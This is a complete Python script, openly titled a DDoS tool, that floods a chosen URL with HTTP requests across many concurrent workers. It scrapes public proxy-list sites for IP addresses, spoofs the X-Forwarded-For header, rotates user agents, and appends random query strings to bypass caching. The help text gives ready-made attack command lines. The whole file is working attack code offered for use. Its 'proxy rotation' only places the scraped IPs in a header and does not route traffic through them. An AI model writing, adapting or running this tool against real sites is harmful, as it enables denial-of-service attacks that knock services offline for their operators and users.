#!/usr/bin/env python3
"""
DDOS-TOOL.PY - Advanced DDoS Tool with Proxy Rotation
=======================================================
Version: 2026.0 - Ultimate Edition
Features:
- Multi-threaded HTTP Flood
- Automatic Proxy Rotation
- IP Spoofing with X-Forwarded-For
- Random User-Agent Rotation
- Custom Port Support
- URL Targeting
- Rate Limiting Control
- Timeout Configuration
- Proxy List Fetching from Multiple Sources
"""

import asyncio
import aiohttp
import random
import re
import itertools
import argparse
import sys
import time
from datetime import datetime
from colorama import Fore, init, Style

# Initialize colorama
init(autoreset=True)

# ============================================
# VERSION INFORMATION
# ============================================
VERSION = "2026.0"
RELEASE_DATE = "2026-01-01"
BUILD_NUMBER = "2026.001"
AUTHOR = "Security Research Team"

# ============================================
# COLOR CODES
# ============================================
class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    RESET = Fore.RESET
    BOLD = Style.BRIGHT

# ============================================
# CONFIGURATION
# ============================================
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

PROXY_LIST_URLS = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
]

# ============================================
# MAIN DDOS CLASS
# ============================================
class DDosTool:
    """Advanced DDoS Tool with Proxy Rotation"""

    def __init__(self, args):
        self.args = args
        
        # Attack parameters
        self.target_url = args.url
        self.port = args.port or self.get_port_from_url()
        self.threads = args.threads or 100
        self.requests_per_second = args.rate or 10
        self.timeout = args.timeout or 10
        self.duration = args.duration or 0
        
        # Proxy settings
        self.use_proxies = args.proxy
        self.proxy_list = []
        self.proxy_cycle = None
        
        # User agents
        self.user_agents = DEFAULT_USER_AGENTS
        if args.user_agents:
            self.load_user_agents(args.user_agents)
        
        # Statistics
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        self.running = False
        
        # Verbose
        self.verbose = args.verbose or False
        
        # Print banner
        self.print_banner()
        
        # Load proxies if enabled
        if self.use_proxies:
            self.load_proxies()

    def get_port_from_url(self):
        """Extract port from URL"""
        import re
        match = re.search(r':(\d+)', self.target_url)
        if match:
            return int(match.group(1))
        return 443 if self.target_url.startswith('https') else 80

    def load_user_agents(self, file_path):
        """Load user agents from file"""
        try:
            with open(file_path, 'r') as f:
                agents = [line.strip() for line in f if line.strip()]
                if agents:
                    self.user_agents = agents
                    if self.verbose:
                        print(Colors.GREEN + f"[+] Loaded {len(agents)} user agents from {file_path}" + Colors.RESET)
        except Exception as e:
            print(Colors.YELLOW + f"[!] Error loading user agents: {e}" + Colors.RESET)

    def print_banner(self):
        """Print banner"""
        art = r"""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║     ██████╗ ██████╗  ██████╗ ███████╗                           ║
║     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝                           ║
║     ██║  ██║██████╔╝██║   ██║███████╗                           ║
║     ██║  ██║██╔══██╗██║   ██║╚════██║                           ║
║     ██████╔╝██║  ██║╚██████╔╝███████║                           ║
║     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝                           ║
║                                                                  ║
║         Advanced DDoS Tool - Proxy Rotation Edition             ║
║                     Version: 2026.0                              ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝"""
        
        print(Colors.RED + art + Colors.RESET)
        print(Colors.CYAN + "=" * 70 + Colors.RESET)
        print(Colors.GREEN + f"[+] Author: {AUTHOR}")
        print(Colors.GREEN + f"[+] Version: {VERSION}")
        print(Colors.GREEN + f"[+] Build: {BUILD_NUMBER}")
        print(Colors.CYAN + "=" * 70 + Colors.RESET)
        print(Colors.YELLOW + "[!] Warning: Use at your own risk!" + Colors.RESET)
        print(Colors.CYAN + "=" * 70 + Colors.RESET + "\n")

    async def fetch_ip_addresses(self, url, session):
        """Fetch IP addresses from a proxy list URL"""
        try:
            async with session.get(url, timeout=10) as response:
                text = await response.text()
                ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                # Filter out private IPs
                valid_ips = []
                for ip in ip_addresses:
                    if not ip.startswith(('10.', '172.', '192.168.', '127.')):
                        valid_ips.append(ip)
                if self.verbose:
                    print(Colors.GREEN + f"[+] Found {len(valid_ips)} IP addresses from {url}" + Colors.RESET)
                return valid_ips
        except Exception as e:
            if self.verbose:
                print(Colors.RED + f"[-] Error fetching IP list from {url}: {e}" + Colors.RESET)
            return []

    async def get_all_ips(self):
        """Get all IP addresses from proxy list URLs"""
        async with aiohttp.ClientSession() as session:
            tasks = [self.fetch_ip_addresses(url, session) for url in PROXY_LIST_URLS]
            ip_lists = await asyncio.gather(*tasks)
            all_ips = [ip for sublist in ip_lists for ip in sublist]
            
            # Remove duplicates
            all_ips = list(set(all_ips))
            
            print(Colors.GREEN + f"[+] Total unique IPs fetched: {len(all_ips)}" + Colors.RESET)
            return all_ips

    def load_proxies(self):
        """Load proxies from file or fetch from internet"""
        print(Colors.CYAN + "[*] Loading proxies..." + Colors.RESET)
        
        if self.args.proxy_file and self.args.proxy_file != 'proxies.txt':
            # Load from file
            try:
                with open(self.args.proxy_file, 'r') as f:
                    self.proxy_list = [line.strip() for line in f if line.strip()]
                print(Colors.GREEN + f"[+] Loaded {len(self.proxy_list)} proxies from {self.args.proxy_file}" + Colors.RESET)
            except Exception as e:
                print(Colors.RED + f"[-] Error loading proxy file: {e}" + Colors.RESET)
                self.proxy_list = []
        else:
            # Fetch from internet
            print(Colors.CYAN + "[*] Fetching proxies from internet..." + Colors.RESET)
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                self.proxy_list = loop.run_until_complete(self.get_all_ips())
                loop.close()
            except Exception as e:
                print(Colors.RED + f"[-] Error fetching proxies: {e}" + Colors.RESET)
                self.proxy_list = []

        if self.proxy_list:
            self.proxy_cycle = itertools.cycle(self.proxy_list)
            print(Colors.GREEN + f"[+] Total proxies available: {len(self.proxy_list)}" + Colors.RESET)
        else:
            print(Colors.YELLOW + "[!] No proxies available. Using direct connection." + Colors.RESET)
            self.proxy_list = []

    def get_next_proxy(self):
        """Get next proxy from list"""
        if not self.proxy_cycle or not self.proxy_list:
            return None
        return next(self.proxy_cycle)

    async def send_request(self, session, proxy_ip=None):
        """Send a single HTTP request"""
        # Build URL with port
        target = self.target_url
        if self.port and self.port not in [80, 443]:
            # Add port to URL if not default
            if ':' not in target.split('/')[2]:
                parsed = target.split('/')
                target = f"{parsed[0]}//{parsed[2].split(':')[0]}:{self.port}{'/' + '/'.join(parsed[3:]) if len(parsed) > 3 else ''}"
        
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }
        
        # Add X-Forwarded-For for IP spoofing
        if proxy_ip:
            headers["X-Forwarded-For"] = proxy_ip
        
        # Add random query parameter to bypass cache
        if '?' in target:
            target += f"&_={random.randint(100000, 999999)}"
        else:
            target += f"?_={random.randint(100000, 999999)}"
        
        try:
            async with session.get(
                target, 
                headers=headers, 
                timeout=self.timeout,
                ssl=False
            ) as response:
                self.total_requests += 1
                if response.status in [200, 301, 302, 403]:
                    self.successful_requests += 1
                    if self.verbose:
                        print(Colors.GREEN + f"[+] Request #{self.total_requests} - Status: {response.status} - Proxy: {proxy_ip or 'Direct'}" + Colors.RESET)
                else:
                    self.failed_requests += 1
                    if self.verbose:
                        print(Colors.YELLOW + f"[!] Request #{self.total_requests} - Status: {response.status} - Proxy: {proxy_ip or 'Direct'}" + Colors.RESET)
        except asyncio.TimeoutError:
            self.failed_requests += 1
            if self.verbose:
                print(Colors.RED + f"[-] Request #{self.total_requests} - Timeout - Proxy: {proxy_ip or 'Direct'}" + Colors.RESET)
        except Exception as e:
            self.failed_requests += 1
            if self.verbose:
                print(Colors.RED + f"[-] Request #{self.total_requests} - Error: {str(e)[:50]} - Proxy: {proxy_ip or 'Direct'}" + Colors.RESET)

    async def attack_worker(self, session):
        """Worker for sending requests"""
        delay = 1.0 / self.requests_per_second if self.requests_per_second > 0 else 0.1
        
        while self.running:
            proxy_ip = self.get_next_proxy() if self.proxy_list else None
            await self.send_request(session, proxy_ip)
            await asyncio.sleep(delay)

    async def start_attack_async(self):
        """Start the attack asynchronously"""
        # Build target URL with port
        target = self.target_url
        if self.port and self.port not in [80, 443]:
            if ':' not in target.split('/')[2]:
                parsed = target.split('/')
                target = f"{parsed[0]}//{parsed[2].split(':')[0]}:{self.port}{'/' + '/'.join(parsed[3:]) if len(parsed) > 3 else ''}"
        self.target_url = target
        
        print(Colors.CYAN + "=" * 70 + Colors.RESET)
        print(Colors.GREEN + "[+] Attack Configuration:" + Colors.RESET)
        print(Colors.CYAN + f"    Target: {self.target_url}" + Colors.RESET)
        print(Colors.CYAN + f"    Port: {self.port}" + Colors.RESET)
        print(Colors.CYAN + f"    Threads: {self.threads}" + Colors.RESET)
        print(Colors.CYAN + f"    Rate: {self.requests_per_second} req/sec per thread" + Colors.RESET)
        print(Colors.CYAN + f"    Timeout: {self.timeout}s" + Colors.RESET)
        print(Colors.CYAN + f"    Proxies: {len(self.proxy_list)} loaded" + Colors.RESET)
        print(Colors.CYAN + f"    User Agents: {len(self.user_agents)}" + Colors.RESET)
        if self.duration > 0:
            print(Colors.CYAN + f"    Duration: {self.duration}s" + Colors.RESET)
        print(Colors.CYAN + "=" * 70 + Colors.RESET)

        print(Colors.RED + "[!] Starting attack... Press Ctrl+C to stop" + Colors.RESET)

        self.running = True
        self.start_time = datetime.now()

        async with aiohttp.ClientSession() as session:
            workers = []
            for _ in range(self.threads):
                workers.append(self.attack_worker(session))
            
            # Run workers
            if self.duration > 0:
                # Attack with duration limit
                await asyncio.wait_for(
                    asyncio.gather(*workers),
                    timeout=self.duration
                )
            else:
                # Attack until stopped
                await asyncio.gather(*workers)

    def start_attack(self):
        """Start the attack"""
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self.start_attack_async())
            loop.close()
        except asyncio.TimeoutError:
            # Duration ended
            self.stop_attack()
        except KeyboardInterrupt:
            print(Colors.YELLOW + "\n[!] Interrupted by user" + Colors.RESET)
            self.stop_attack()
        except Exception as e:
            print(Colors.RED + f"[-] Attack error: {e}" + Colors.RESET)

    def stop_attack(self):
        """Stop the attack"""
        self.running = False
        
        elapsed = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
        
        print(Colors.CYAN + "=" * 70 + Colors.RESET)
        print(Colors.GREEN + "[+] Attack Stopped!" + Colors.RESET)
        print(Colors.CYAN + f"    Total Requests: {self.total_requests}" + Colors.RESET)
        print(Colors.CYAN + f"    Successful: {self.successful_requests}" + Colors.RESET)
        print(Colors.CYAN + f"    Failed: {self.failed_requests}" + Colors.RESET)
        print(Colors.CYAN + f"    Duration: {elapsed:.2f} seconds" + Colors.RESET)
        if elapsed > 0:
            print(Colors.CYAN + f"    Average RPS: {self.total_requests / elapsed:.2f}" + Colors.RESET)
            print(Colors.CYAN + f"    Success Rate: {(self.successful_requests / self.total_requests * 100) if self.total_requests > 0 else 0:.1f}%" + Colors.RESET)
        print(Colors.CYAN + "=" * 70 + Colors.RESET)

# ============================================
# COMMAND LINE ARGUMENTS
# ============================================
def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='Advanced DDoS Tool with Proxy Rotation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
╔══════════════════════════════════════════════════════════════════════════════╗
║                              EXAMPLES                                        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  Basic Attack:                                                               ║
║  python ddos-Tool.py --url https://example.com --threads 100                ║
║                                                                              ║
║  Attack with Custom Port:                                                    ║
║  python ddos-Tool.py --url https://example.com --port 8080 --threads 50     ║
║                                                                              ║
║  Attack with Proxy Rotation:                                                 ║
║  python ddos-Tool.py --url https://example.com --proxy --threads 200        ║
║                                                                              ║
║  Attack with Custom Proxy File:                                              ║
║  python ddos-Tool.py --url https://example.com --proxy --proxy-file my.txt  ║
║                                                                              ║
║  Timed Attack (60 seconds):                                                  ║
║  python ddos-Tool.py --url https://example.com --duration 60 --threads 100  ║
║                                                                              ║
║  Verbose Mode with Custom Rate:                                              ║
║  python ddos-Tool.py --url https://example.com --rate 20 --verbose          ║
║                                                                              ║
║  Custom User Agents File:                                                    ║
║  python ddos-Tool.py --url https://example.com --user-agents agents.txt     ║
║                                                                              ║
║  Help:                                                                       ║
║  python ddos-Tool.py --help                                                  ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """
    )

    # Required arguments
    parser.add_argument(
        '--url', '-u',
        required=True,
        help='Target URL (e.g., https://example.com)'
    )

    # Attack configuration
    parser.add_argument(
        '--port', '-p',
        type=int,
        help='Target port (default: 443 for HTTPS, 80 for HTTP)'
    )

    parser.add_argument(
        '--threads', '-t',
        type=int,
        default=100,
        help='Number of threads (1-1000, default: 100)'
    )

    parser.add_argument(
        '--rate', '-r',
        type=int,
        default=10,
        help='Requests per second per thread (1-100, default: 10)'
    )

    parser.add_argument(
        '--timeout', '-T',
        type=int,
        default=10,
        help='Request timeout in seconds (1-30, default: 10)'
    )

    parser.add_argument(
        '--duration', '-d',
        type=int,
        default=0,
        help='Attack duration in seconds (0 = unlimited, default: 0)'
    )

    # Proxy options
    parser.add_argument(
        '--proxy', '-P',
        action='store_true',
        help='Enable proxy rotation (fetch proxies from internet)'
    )

    parser.add_argument(
        '--proxy-file',
        type=str,
        default='proxies.txt',
        help='Path to custom proxy file (format: ip:port per line)'
    )

    # User agent options
    parser.add_argument(
        '--user-agents',
        type=str,
        help='Path to user agents file (one per line)'
    )

    # Additional options
    parser.add_argument(
        '--verbose', '-v',
        action='store_true',
        help='Enable verbose output'
    )

    parser.add_argument(
        '--version',
        action='version',
        version=f'ddos-Tool.py v{VERSION}'
    )

    return parser.parse_args()

# ============================================
# MAIN FUNCTION
# ============================================
def main():
    """Main function"""
    try:
        args = parse_arguments()
        
        # Create tool instance
        tool = DDosTool(args)
        
        # Start attack
        tool.start_attack()
        
        print(Colors.GREEN + "\n[+] Attack completed successfully!" + Colors.RESET)
        return 0
        
    except KeyboardInterrupt:
        print(Colors.YELLOW + "\n[!] Interrupted by user" + Colors.RESET)
        return 130
    except Exception as e:
        print(Colors.RED + f"\n[-] Fatal Error: {e}" + Colors.RESET)
        import traceback
        traceback.print_exc()
        return 1

# ============================================
# ENTRY POINT
# ============================================
if __name__ == "__main__":
    sys.exit(main())
